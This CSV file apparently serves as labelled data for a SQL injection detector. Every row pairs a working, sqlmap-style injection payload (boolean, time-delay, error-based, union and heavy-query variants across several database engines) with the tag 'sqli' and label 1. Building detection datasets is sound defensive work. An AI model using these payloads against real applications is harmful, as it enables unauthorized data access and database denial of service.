payload,attack_type,label
"-3347%"" or 9323=9323#",sqli,1
"1%""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""%""=""",sqli,1
1') as ubvf where 5923=5923 and 8490=4925--,sqli,1
"1%"") waitfor delay '0:0:5' and (""%""=""",sqli,1
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,1
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""umfr"" like ""umfr",sqli,1
"1"") as ufai where 9673=9673;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
"iif(3204=8489,3204,1/0)",sqli,1
"-5292') union all select 1439,1439,1439,1439#",sqli,1
"1)) as llnm where 6510=6510 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"-1407 where 1186=1186 union all select 1186,1186,1186,1186,1186--",sqli,1
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",sqli,1
-8028%'))) or 5042=5214,sqli,1
-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1
"-3109"" or elt(1032=1032,3623)",sqli,1
1)));select (case when (4636=1108) then 1 else 4636*(select 4636 from master..sysdatabases) end)--,sqli,1
1' order by 1#,sqli,1
1)) as wwkw where 7289=7289 and 7533=7533--,sqli,1
-5694)) as cxnb where 6858=6858 or 9323=9323#,sqli,1
-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902,sqli,1
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('trdf' like 'trdf",sqli,1
"-1550%""))) order by 1--",sqli,1
"1"" where 7371=7371 waitfor delay '0:0:5'--",sqli,1
"1"" where 9014=9014 and 6969=(select 6969 from pg_sleep(5))--",sqli,1
-6529') or (4309=1601)*1601,sqli,1
-9178') or 9779=6351,sqli,1
"1"") as htyo where 8322=8322 and 4595=4595#",sqli,1
"-9166"") as hlre where 4768=4768 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1
"1"") as mwja where 7881=7881 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1
"-5024%"" or make_set(3321=7355,7355) and ""%""=""",sqli,1
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1
-3634%')) or 2671=2434,sqli,1
1'))) union all select null#,sqli,1
1'||(select 'ucxp' where 6612=6612 order by 1--,sqli,1
1) and (select * from (select(sleep(5)))fzno),sqli,1
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1
"-1079"") where 2865=2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",sqli,1
"-7448 union all select 4072,4072#",sqli,1
"1""))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"-3349' or elt(6610=4379,4379) and 'poqm' like 'poqm",sqli,1
1')) rlike (select * from (select(sleep(5)))sgvo) and (('pemj'='pemj,sqli,1
1%')));if(9770=9748) select 9770 else drop function zyuo--,sqli,1
"1'))) union all select null,null,null,null,null,null,null,null--",sqli,1
"1')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
1') where 4364=4364 and 8594=(select 8594 from pg_sleep(5))--,sqli,1
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rjjo'='rjjo,sqli,1
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""arqb"" like ""arqb",sqli,1
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('jicq' like 'jicq",sqli,1
1') waitfor delay '0:0:5' and ('vtfs'='vtfs,sqli,1
"-9854) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (5696=5696",sqli,1
1%')));begin dbms_lock.sleep(5); end--,sqli,1
"1') where 2808=2808;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1
-7726 or 3038=3038,sqli,1
"1 and elt(4249=4249,7259)",sqli,1
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('msol'='msol",sqli,1
"1) where 8008=8008 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1,(select (case when (7616=7616) then 1 else 1/(select 0) end))",sqli,1
"1');iif(1095=2853,1,1/0)",sqli,1
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""bvdv"" like ""bvdv",sqli,1
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1
"1)) as dnwj where 2961=2961 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1' where 1692=1692;begin dbms_lock.sleep(5); end--,sqli,1
"1'||(select 'asfl' from dual where 5846=5846 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1"")) as yuqr where 7226=7226 and (select * from (select(sleep(5)))gcrr)#",sqli,1
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('wdeu' like 'wdeu",sqli,1
"-8153' where 2436=2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",sqli,1
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fktl""=""fktl",sqli,1
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)# usus",sqli,1
"1"" union all select null,null,null,null,null,null,null,null#",sqli,1
1' in boolean mode);begin user_lock.sleep(5); end--,sqli,1
"1%'));iif(5519=4796,1,1/0)",sqli,1
-1648)) as oqqy where 3459=3459 or 6872=6872--,sqli,1
"-9698')) as qnjv where 3360=3360 or make_set(9354=9354,7185)--",sqli,1
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('wsmq'='wsmq",sqli,1
"1"")) as upvg where 4826=4826;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1""));select pg_sleep(5) and ((""qani""=""qani",sqli,1
"1""))) union all select null,null,null,null--",sqli,1
"1"";begin user_lock.sleep(5); end and ""unqj""=""unqj",sqli,1
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",sqli,1
-8233' or 9538=1882#,sqli,1
"-7794"") union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",sqli,1
"1') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1'+(select 'ndpx' where 4061=4061 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"-1591 where 3291=3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",sqli,1
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""umst""=""umst",sqli,1
"1) as svkf where 6503=6503 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%')) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
"-9240' union all select 6538,6538,6538#",sqli,1
"1))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((6312=6312",sqli,1
"1'||(select 'jpso' from dual where 9357=9357 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",sqli,1
"-6360') as yfrk where 3683=3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",sqli,1
"-1922%') union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",sqli,1
(select (case when (9337=9337) then waitfor delay '0:0:5' else 9337*(select 9337 from master..sysdatabases) end)),sqli,1
"1,(select (case when (8392=8404) then 1 else 8392*(select 8392 from information_schema.character_sets) end))",sqli,1
1') and (3020=3020)*6703 and ('botl' like 'botl,sqli,1
"1"")) as osuh where 8809=8809;select (case when (9388=4322) then 1 else 9388*(select 9388 from master..sysdatabases) end)--",sqli,1
1%')) and 3721=2597#,sqli,1
1') and 2564=3234--,sqli,1
"1) union all select null,null,null--",sqli,1
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'ytlf'='ytlf",sqli,1
"1%' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",sqli,1
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",sqli,1
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",sqli,1
"1%""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""%""=""",sqli,1
1)) as beld where 1679=1679 or sleep(5)#,sqli,1
"1) where 8164=8164 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"1"")) and sleep(5) and ((""lied"" like ""lied",sqli,1
"1"" and 3824=benchmark(5000000,md5(0x76555642))",sqli,1
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,sqli,1
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,sqli,1
"1%"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""%""=""",sqli,1
"-8069)) as sxbn where 7689=7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",sqli,1
"1'+(select snam where 1993=1993;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""sfnj"" like ""sfnj",sqli,1
"elt(2567=9921,9921)",sqli,1
"1'||(select 'jlon' where 1461=1461;iif(5257=5257,1,1/0)",sqli,1
"1',iif(7475=7475,1,1/0)",sqli,1
1') as wquy where 2518=2518;select sleep(5)#,sqli,1
"-1432"")) union all select 9008,9008,9008#",sqli,1
"1"" where 9241=9241 union all select null#",sqli,1
1') or (select * from (select(sleep(5)))ydpu) and ('brob'='brob,sqli,1
-1854') as fmmq where 7326=7326 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1
"-3437) union all select 7774,7774,7774--",sqli,1
1) as bidc where 5268=5268 and (select * from (select(sleep(5)))fzno)--,sqli,1
-8701%')) or (4843=1690)*1690 and (('%'=',sqli,1
"1')));iif(7889=5114,1,1/0)",sqli,1
"-1503"" order by 1--",sqli,1
"1"")) as uqkn where 4642=4642 or elt(6272=6272,sleep(5))--",sqli,1
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",sqli,1
-8836%') or 4856=3891,sqli,1
"1%"" union all select null,null,null,null,null,null,null#",sqli,1
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'yvxg'='yvxg,sqli,1
"-1512 union all select 9013,9013,9013,9013#",sqli,1
1';if(4947=5350) select 4947 else drop function ereg--,sqli,1
-1910' or 2624=3371 and 'umoy'='umoy,sqli,1
-1011 or 7140=9977--,sqli,1
"1 where 2292=2292 union all select null,null,null,null#",sqli,1
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('seyd'='seyd",sqli,1
-8187'))) or 1698=2823#,sqli,1
"1%""))) and 4595=4595#",sqli,1
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1
"1'||(select 'hfbt' where 7204=7204 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",sqli,1
1')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
"-8677'||(select 'ihpm' from dual where 9571=9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",sqli,1
"1""))) union all select null,null,null,null,null,null,null,null,null--",sqli,1
"1') where 5799=5799 union all select null,null,null,null,null--",sqli,1
"1"" and (7424=2381)*2381 and ""dvju""=""dvju",sqli,1
"1"";select sleep(5) and ""irxg""=""irxg",sqli,1
1')) and sleep(5) and (('krrr'='krrr,sqli,1
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('msjw' like 'msjw",sqli,1
"1"") as yphz where 8174=8174 union all select null,null,null,null,null,null,null--",sqli,1
"1'||(select 'fwph' where 3791=3791;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1%"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""%""=""",sqli,1
1') and (2763=4004)*4004 and ('dtts'='dtts,sqli,1
"1%';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and '%'='",sqli,1
-2707'))) or (8459=8459)*4906 and ((('mwdq'='mwdq,sqli,1
1'+(select 'vidl' where 9445=9445 and 5498=5777#,sqli,1
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('eocx'='eocx,sqli,1
1')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1
"1""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1
1))) or 4240=(select 4240 from pg_sleep(5))--,sqli,1
"1,(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))",sqli,1
"-3609"")) as fzyp where 9474=9474 or 9323=9323#",sqli,1
"1' where 5778=5778;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1
-6412%' or 4065=5815 and '%'=',sqli,1
"-5355"" or make_set(9354=9354,7185)",sqli,1
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('yzdp'='yzdp",sqli,1
"1'+(select 'mdiu' where 4443=4443;select benchmark(5000000,md5(0x4c4d6142)))+'",sqli,1
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",sqli,1
"1"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"") as fcrx where 2929=2929 and 2820=5133",sqli,1
"1"")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'xnap'='xnap,sqli,1
1')) and 7533=7533 and (('ialm'='ialm,sqli,1
"1)) as vmwj where 5597=5597;iif(5257=5257,1,1/0)",sqli,1
-5918') as olzc where 5992=5992 or 4390=9085,sqli,1
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""%""=""",sqli,1
"1 where 1776=1776 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1"")) and (3020=3020)*6703 and ((""njdx"" like ""njdx",sqli,1
"1%""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",sqli,1
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",sqli,1
"1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'='",sqli,1
1) as ryks where 1196=1196;select (case when (1005=5996) then 1 else 1005*(select 1005 from master..sysdatabases) end)--,sqli,1
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",sqli,1
"1%"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1
"1' where 8864=8864;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1
"1') where 7391=7391 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1
1 where 2384=2384 and (select * from (select(sleep(5)))gcrr)#,sqli,1
"-3805""))) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",sqli,1
"1' in boolean mode) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('uyft'='uyft",sqli,1
-4055')) as yoez where 3816=3816 or (8459=8459)*4906--,sqli,1
"1'||(select 'ysij' from dual where 6140=6140 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))||'",sqli,1
"-2962'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('hkjo'='hkjo",sqli,1
"1'+(select 'qmtx' where 6992=6992 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
1);begin dbms_lock.sleep(5); end,sqli,1
1'+(select dklj where 3265=3265;select sleep(5)#,sqli,1
"1 where 3410=3410 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"-4596"" union all select 5761#",sqli,1
"1""));waitfor delay '0:0:5' and ((""zili"" like ""zili",sqli,1
"1%""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1
"1"")) as jgie where 8017=8017 and (select * from (select(sleep(5)))fzno)--",sqli,1
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""pebw"" like ""pebw",sqli,1
"1')) as yyja where 4321=4321 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1'+(select 'arzm' where 6464=6464 or 8466=benchmark(5000000,md5(0x694a4745)))+'",sqli,1
"1%' and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"-3081""))) or 3736=1899",sqli,1
"1')) as umah where 3781=3781 union all select null,null,null,null#",sqli,1
"-3090"" or make_set(9354=9354,7185) and ""qowe"" like ""qowe",sqli,1
1' and (3020=3020)*6703,sqli,1
-4082)) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((7874=7874,sqli,1
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1
"1) where 4573=4573;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1
1')) as bewk where 3672=3672 or sleep(5)--,sqli,1
"1' in boolean mode) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",sqli,1
"1%' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"1))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((2230=2230",sqli,1
"-8301') union all select 1806,1806--",sqli,1
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('tvcm'='tvcm",sqli,1
"1%""))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
-8729'+(select 'nbzl' where 7160=7160 order by 1#,sqli,1
-4713'))) or 4567=1287,sqli,1
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""yobb"" like ""yobb",sqli,1
"1'+(select 'stdl' where 4581=4581;iif(7953=3021,1,1/0)",sqli,1
-5217 where 3620=3620 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1
"1%""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",sqli,1
-7772')) or 9323=9323#,sqli,1
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""znzb"" like ""znzb",sqli,1
"(select (case when (3531=3531) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 3531 end))",sqli,1
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))# lchh",sqli,1
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",sqli,1
1'+(select ejaj where 1651=1651 or 6793=(select 6793 from pg_sleep(5)))+',sqli,1
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""uhvy""=""uhvy",sqli,1
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli,1
"-4798""))) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",sqli,1
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",sqli,1
-2992%'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',sqli,1
"-9928"")) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",sqli,1
"1) where 1443=1443 union all select null,null,null,null,null#",sqli,1
-1662 where 1119=1119 or (8459=8459)*4906--,sqli,1
1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+',sqli,1
"1"" where 6501=6501;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1
"1%' union all select null,null,null,null,null,null--",sqli,1
"1%"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",sqli,1
"1"")) as knyf where 8109=8109 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1' where 6721=6721 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1
"1"")));select count(*) from generate_series(1,5000000)--",sqli,1
1' and 7533=7533 and 'jwgc'='jwgc,sqli,1
"-2748')) as gazw where 4624=4624 union all select 4624,4624#",sqli,1
"1"");waitfor delay '0:0:5'--",sqli,1
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",sqli,1
"1'+(select 'lawc' where 1171=1171 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
"1"") as ztkr where 1532=1532;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"-3270%' or elt(9404=3498,3498) and '%'='",sqli,1
"1""))) union all select null,null,null,null,null,null,null,null#",sqli,1
"1"")) rlike (select * from (select(sleep(5)))vwyq)#",sqli,1
-4324 order by 1--,sqli,1
"1) as ndgd where 2367=2367 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
"1"" where 1831=1831 and (select * from (select(sleep(5)))gcrr)#",sqli,1
1)) as ztcn where 1043=1043 and 6305=5785--,sqli,1
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""opgb"" like ""opgb",sqli,1
-6984 order by 1#,sqli,1
"1) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1')) union all select null,null,null#",sqli,1
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('xhez' like 'xhez",sqli,1
-9212 or 1026=7967#,sqli,1
"1"") where 9020=9020 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1
"1 and elt(1210=1210,sleep(5))# macc",sqli,1
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""atlz""=""atlz",sqli,1
"1"")) union all select null,null,null,null--",sqli,1
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,sqli,1
"1)));select count(*) from generate_series(1,5000000) and (((1321=1321",sqli,1
"1')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
